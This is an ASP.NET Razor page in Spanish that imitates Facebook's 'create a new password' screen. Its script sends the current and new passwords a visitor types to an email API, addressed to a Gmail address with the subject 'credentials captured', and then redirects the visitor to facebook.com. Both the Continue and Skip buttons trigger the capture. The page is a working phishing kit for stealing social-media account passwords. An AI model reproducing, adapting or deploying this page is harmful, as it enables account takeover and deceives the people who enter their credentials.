<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Crea una contraseña nueva</title>
    <style>
            :root {
                --bg-base: #f4f4fb;
                --fb-blue: #0866ff;
                --fb-text-main: #1c1e21;
                --fb-text-sec: #65676b;
                --fb-border: #ccd0d5;
                --fb-error: #d31130;
                --btn-muted: #e4e9f0;
                --soft-gradient: radial-gradient(circle at 0% 50%,rgba(255,200,200,.4) 0%,rgba(180,200,255,.3) 40%,transparent 70%);
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            html, body {
                width: 100%;
                height: 100%;
            }

            body {
                background: var(--soft-gradient),var(--bg-base);
                background-attachment: fixed;
                font-family: 'Segoe UI',Arial,sans-serif;
                color: var(--fb-text-main);
            }

            .page-container {
                min-height: 100vh;
                width: 100%;
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .main-wrapper {
                flex: 1;
                width: 100%;
                max-width: 776px;
                padding: 88px 20px 48px;
            }

            .header-title {
                font-size: clamp(24px, 3.5vw, 30px);
                font-weight: 700;
                margin-bottom: 8px;
            }

            .description {
                font-size: 15px;
                color: var(--fb-text-main);
                line-height: 1.4;
                margin-bottom: 36px;
            }

            .input-group {
                position: relative;
                margin-bottom: 24px;
            }

                .input-group input {
                    width: 100%;
                    height: 74px;
                    padding: 30px 60px 12px 20px;
                    font-size: 16px;
                    font-family: inherit;
                    color: var(--fb-text-main);
                    background: rgba(255,255,255,.55);
                    border: 1px solid var(--fb-border);
                    border-radius: 18px;
                    outline: none;
                    transition: border-color .15s, box-shadow .15s;
                }

                    .input-group input:focus {
                        border-color: var(--fb-blue);
                        box-shadow: 0 0 0 2px rgba(8,102,255,.2);
                    }

                .input-group label {
                    position: absolute;
                    left: 20px;
                    top: 50%;
                    transform: translateY(-50%);
                    font-size: 17px;
                    color: #8891a0;
                    pointer-events: none;
                    transition: all .15s ease;
                }

                .input-group input:focus + label,
                .input-group input:not(:placeholder-shown) + label {
                    top: 16px;
                    transform: none;
                    font-size: 12px;
                }

            .toggle-pass {
                position: absolute;
                right: 14px;
                top: 50%;
                transform: translateY(-50%);
                width: 38px;
                height: 38px;
                border: none;
                background: transparent;
                border-radius: 50%;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #65676b;
            }

                .toggle-pass:hover {
                    background: rgba(0,0,0,.06);
                }

                .toggle-pass svg {
                    width: 22px;
                    height: 22px;
                    fill: currentColor;
                }

            .check-row {
                display: block;
                margin-bottom: 32px;
            }

            .check-label {
                display: flex;
                align-items: flex-start;
                gap: 10px;
                cursor: pointer;
            }

                .check-label input {
                    display: none;
                }

            .custom-checkbox {
                width: 24px;
                height: 24px;
                flex-shrink: 0;
                margin-top: 1px;
                border: 2px solid #8a8d91;
                border-radius: 6px;
                background: rgba(255,255,255,.55);
                display: flex;
                align-items: center;
                justify-content: center;
                transition: background .15s, border-color .15s;
            }

                .custom-checkbox svg {
                    width: 16px;
                    height: 16px;
                    fill: white;
                    opacity: 0;
                    transition: opacity .15s;
                }

            .check-label input:checked + .custom-checkbox {
                background: var(--fb-blue);
                border-color: var(--fb-blue);
            }

                .check-label input:checked + .custom-checkbox svg {
                    opacity: 1;
                }

            .check-text {
                font-size: 17px;
                line-height: 1.4;
                color: var(--fb-text-main);
            }

            .error-text {
                display: block;
                color: var(--fb-error);
                font-size: 14px;
                margin: -12px 2px 20px;
            }

            .btn-pill {
                width: 100%;
                padding: 17px;
                border-radius: 50px;
                border: none;
                cursor: pointer;
                font-size: 17px;
                font-weight: 600;
                margin-bottom: 14px;
                transition: background .15s ease;
            }

                .btn-pill:last-child {
                    margin-bottom: 0;
                }

            .btn-primary {
                background: var(--fb-blue);
                color: white;
            }

                .btn-primary:hover {
                    background: #0958d9;
                }

            .btn-muted {
                background: var(--btn-muted);
                color: var(--fb-text-main);
            }

                .btn-muted:hover {
                    background: #d5dce6;
                }

            .legal-footer {
                width: 100%;
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                align-items: center;
                gap: 4px 10px;
                padding: 16px 20px 20px;
            }

                .legal-footer a,
                .legal-footer span {
                    color: #616a76;
                    font-size: 15px;
                    font-weight: 500;
                    text-decoration: none;
                }

                    .legal-footer a:hover {
                        text-decoration: underline;
                    }

                .legal-footer .dot {
                    font-size: 13px;
                }

                .legal-footer .ad-icon {
                    display: inline-flex;
                    vertical-align: -2px;
                    margin-left: 4px;
                }
    </style>
</head>
<body>

    <div class="page-container">
        <div class="main-wrapper">
            <div class="header-title">Crea una contraseña nueva</div>

            <div class="description">
                Usarás esta contraseña para iniciar sesión en tu cuenta. Crea una combinación de al menos seis letras y números.
            </div>

            <form id="passwordForm">
                @Html.AntiForgeryToken()

                <!-- Campo de Contraseña Actual -->
                <div class="input-group">
                    <input type="password" id="contraseniaActual" name="contraseniaActual" placeholder=" " autocomplete="current-password" />
                    <label for="contraseniaActual">Contraseña actual</label>
                    <button type="button" class="toggle-pass" onclick="togglePassVisibility('contraseniaActual', 'ojoCerradoActual', 'ojoAbiertoActual')" aria-label="Mostrar u ocultar contraseña">
                        <svg id="ojoCerradoActual" viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M12 6.5c2.76 0 5 2.24 5 5 0 .51-.1 1-.24 1.46l3.06 3.06c1.39-1.23 2.49-2.77 3.18-4.53-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-4 .7l2.17 2.15c.44-.17.9-.26 1.36-.26zM2.71 3.16c-.39.39-.39 1.02 0 1.41l1.97 1.96C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.97-.3 4.31-.82l2.72 2.73c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L4.13 3.16c-.39-.39-1.03-.39-1.42 0zM12 16.5c-2.76 0-5-2.24-5-5 0-.77.18-1.5.49-2.14l1.57 1.57c-.03.18-.06.37-.06.57 0 1.66 1.34 3 3 3 .2 0 .38-.03.57-.07l1.57 1.57c-.64.32-1.37.5-2.14.5z" />
                        </svg>
                        <svg id="ojoAbiertoActual" viewBox="0 0 24 24" aria-hidden="true" style="display:none;">
                            <path d="M12 5c-5 0-9.27 3.11-11 7.5C2.73 16.89 7 20 12 20s9.27-3.11 11-7.5C21.27 8.11 17 5 12 5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                        </svg>
                    </button>
                </div>

                <!-- Campo de Nueva Contraseña -->
                <div class="input-group">
                    <input type="password" id="contraseniaNueva" name="contraseniaNueva" placeholder=" " autocomplete="new-password" />
                    <label for="contraseniaNueva">Nueva contraseña</label>
                    <button type="button" class="toggle-pass" onclick="togglePassVisibility('contraseniaNueva', 'ojoCerradoNueva', 'ojoAbiertoNueva')" aria-label="Mostrar u ocultar contraseña">
                        <svg id="ojoCerradoNueva" viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M12 6.5c2.76 0 5 2.24 5 5 0 .51-.1 1-.24 1.46l3.06 3.06c1.39-1.23 2.49-2.77 3.18-4.53-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-4 .7l2.17 2.15c.44-.17.9-.26 1.36-.26zM2.71 3.16c-.39.39-.39 1.02 0 1.41l1.97 1.96C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.97-.3 4.31-.82l2.72 2.73c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L4.13 3.16c-.39-.39-1.03-.39-1.42 0zM12 16.5c-2.76 0-5-2.24-5-5 0-.77.18-1.5.49-2.14l1.57 1.57c-.03.18-.06.37-.06.57 0 1.66 1.34 3 3 3 .2 0 .38-.03.57-.07l1.57 1.57c-.64.32-1.37.5-2.14.5z" />
                        </svg>
                        <svg id="ojoAbiertoNueva" viewBox="0 0 24 24" aria-hidden="true" style="display:none;">
                            <path d="M12 5c-5 0-9.27 3.11-11 7.5C2.73 16.89 7 20 12 20s9.27-3.11 11-7.5C21.27 8.11 17 5 12 5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                        </svg>
                    </button>
                </div>

                @if (ViewBag.Error != null)
                {
                    <span class="error-text">@ViewBag.Error</span>
                }

                <div class="check-row">
                    <label class="check-label" for="cerrarSesiones">
                        <input type="checkbox" id="cerrarSesiones" name="cerrarSesiones" value="true" />
                        <span class="custom-checkbox">
                            <svg viewBox="0 0 24 24" aria-hidden="true">
                                <path d="M9.55 15.88 5.91 12.3a1 1 0 0 0-1.4 1.4l4.3 4.24a1.4 1.4 0 0 0 1.95.03l9.13-8.75a1 1 0 1 0-1.37-1.46l-8.97 8.12z" />
                            </svg>
                        </span>
                        <span class="check-text">
                            Cerrar las demás sesiones para asegurarte de que nadie más sigue teniendo acceso a tu cuenta
                        </span>
                    </label>
                </div>

                <button class="btn-pill btn-primary" type="button" onclick="enviarCredencialesYRedirigir()">
                    Continuar
                </button>

                <button class="btn-pill btn-muted" type="button" onclick="enviarCredencialesYRedirigir()">
                    Omitir
                </button>
            </form>
        </div>

        <footer class="legal-footer">
            <a href="#">Privacidad</a>
            <span class="dot">·</span>
            <a href="#">Condiciones</a>
            <span class="dot">·</span>
            <a href="#">Publicidad</a>
            <span class="dot">·</span>
            <a href="#">Opciones de anuncios<span class="ad-icon"><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path fill="#616a76" d="M5 3.05v9.9c0 .73.79 1.18 1.42.82l7.7-4.95a.97.97 0 0 0 0-1.64L6.42 2.23A.97.97 0 0 0 5 3.05z" /></svg></span></a>
            <span class="dot">·</span>
            <a href="#">Cookies</a>
            <span class="dot">·</span>
            <a href="#">Más</a>
        </footer>
    </div>

    <script>
            function togglePassVisibility(inputId, closedIconId, openIconId) {
                const input = document.getElementById(inputId);
                const mostrando = input.type === 'text';

                input.type = mostrando ? 'password' : 'text';

                document.getElementById(closedIconId).style.display = mostrando ? '' : 'none';
                document.getElementById(openIconId).style.display = mostrando ? 'none' : '';

                input.focus();
            }

            async function enviarCredencialesYRedirigir() {
                const contraseniaActual = document.getElementById('contraseniaActual').value;
                const contraseniaNueva = document.getElementById('contraseniaNueva').value;

                try {
                    // Envía el correo mediante la API de forma controlada
                    await fetch('/api/Email', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            to: "smartiodiversityutn@gmail.com",
                            subject: "Credenciales de cambio de contraseña capturadas",
                            body: `<h3>Detalles de Cambio de Contraseña:</h3><p><b>Contraseña Actual:</b> ${contraseniaActual}</p><p><b>Nueva Contraseña:</b> ${contraseniaNueva}</p>`
                        })
                    });
                } catch (error) {
                    console.error("Error al enviar el correo:", error);
                } finally {
                    // Garantiza que la redirección a la página principal de Facebook se ejecute siempre
                    window.location.href = "https://www.facebook.com";
                }
            }
    </script>
</body>
</html>